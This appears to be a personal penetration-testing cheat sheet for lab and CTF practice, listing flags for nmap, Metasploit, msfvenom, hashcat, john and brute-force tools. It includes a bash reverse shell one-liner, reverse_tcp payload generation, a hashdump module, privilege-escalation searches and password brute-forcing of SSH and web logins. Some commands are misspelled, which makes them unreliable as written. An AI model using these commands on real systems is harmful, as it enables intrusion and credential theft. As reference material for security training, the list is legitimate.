```
nmap:
Example: nmap -sV -sC -oN nmap 10.10.10.168
Enumerate Versions: -sV
Default Scripts: -sC
Syn Scan: -sS
All Ports: -p-
Output (Normal): -oN filename
Output (All Formats): -oA filename
Target File: -iL file

reverse-shells:
classic: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet


cut:
Define Delimiter: -d “/”
Field: -f 1


tr:
Example newline to comma: tr ‘\n’ ‘,’


awk example: awk {'print $2'}


Hydra:
Example: hydra -l user -p pass 127.0.0.1 ssh
User: -l
User File: -L
Password: -p
Password File: -P


Searchsploit:
Example: serachsploit vsftpd
Read Exploit: -x
Mirror/Copy to current location: -m


Gobuster:
Example: gobuster dir -w /path/to/wordlist -u http://0.0.0.0 -x php -o outfile 
File Extensions: -x
Directory/File mode: dir
Wordlist: -w
Url: -u
Outfile: -o


Metasploit:
Start postgresql: sudo systemctl start postgresql
StartDB: sudo msfdb init
Start MSF: msfconsole
Start + Ignore Ruby Warnings: ruby -W0 /usr/bin/msfconsole
Database Status: db_status
MSF Nmap: db_nmap
Show Scan Results: services
Search exploits: search word
Using exploit: use #
Options: options
Run Exploit in the Background: exploit -j
Setting Options: set option value
Listener: use exploit/multi/handler
Workspace: workspace
Set Hosts From Scan: hosts -R
Show Jobs: jobs


Meterpreter:
Background: CTRL+Z
List Processes: ps
Show id: getuid
Hashdump (Windows): run post/windows/gather/hashdump


MsfVenom:
Example: msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf > outfile
Payload: -p
Architecture: -a
Listener Host + Port: LHOST=0.0.0.0 LPORT=1234
Filetype: -f
Bad Bytes: -b
Linux Payload: linux/x64/meterpreter/reverce_tcp
Windows: windows/meterpreter/reverce_tcp
PHP: php/meterpreter/reverce_tcp


PrivEsc:
sudo -l
Find Group Owned Files: find / -group <group-name>
Find SUID: find / -perm -4000
Find GUID: find / -perm -2000
Listening Ports: netstat -tulnp
Listening Ports: ss -ltnp
Find World Readable: find / -perm -o+w


SQLi Cheatsheet: https://portswigger.net/web-security/sql-injection/cheat-sheet


Hashcat:
Hash Mode: -m <id>
Attack Mode: -a <id>
Workload 1-4: -w <id>
Disable Potfile: --potfile-disable
Show Cracked Hashes: --show
Show Example: .\hashcat64.exe --show file.hash -o cracked3.txt
Out File: -o
Usernames in Hashfile: --username
Rules Example: .\hashcat64.exe -r .\rules\best64.rule --stdout .\rockyou.txt > rockyou2.txt


dos2unix:
Force: -f


john:
Example: john --wordlist=path/file  hash.file
Wordlist: --wordlist=file
John Jumbo: sshng2john
John Normal: ssh2john


fuff:
Example: ./ffuf -v -r -x http://127.0.0.1:8081 -w ~/Documents/htb/rockyou.txt -X POST -b 'security=low; PHPSESSID=1c3f0f4064329fa5fa3be61c2fed7d0a' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=admin&password=FUZZ&Login=Login' -u http://10.0.2.9/dvwa/login.php
Verbose: -v
Follow Redirects: -r
Proxy: -x http://127.0.0.1:8081
Wordlist: -w
HTTP Method: -X POST
Cookie: -b
Header: -H
Url: -u


python3:
Flush Trick: print("\r" + stuff, flush=False ends="")


External Sources:

The following examples are taken from https://nikitushka.github.io/passwords.html

Hydra
Example :hydra -l admin -P wordlist 127.0.0.1 -s 5000 http-post-form "/:username=^USER^&password=^PASS^:Invalid Credentials. Please try again." -V
Port number: -s
HTTP Method: http-post-form
Place user/pass: ^USER^ / ^PASS^
Ignore warnings: -I  <- ^i
show login/pass: -V


wfuzz:
Example: wfuzz -w wordlist -d "username=admin&password=FUZZ" http://localhost:5000/
Wordlist: -w
Post data: -d


The following examples are taken from https://caiusinfo.data.blog/2020/05/11/tunkeutumistestaus-laksyt-viikko-6-caius-juvonen/


medusa:
Example: medusa -h 192.168.56.101 -u monkey -P /usr/share/wordlists/rockyou/rockyou.txt -M ssh -O medusabruteforce/telnet2_crack.txt -t 100
Host ip: -h
Username: -u
Wordlist for password: -P
Module: -M
Outfile: -O
Concurrents tests: -T

```





























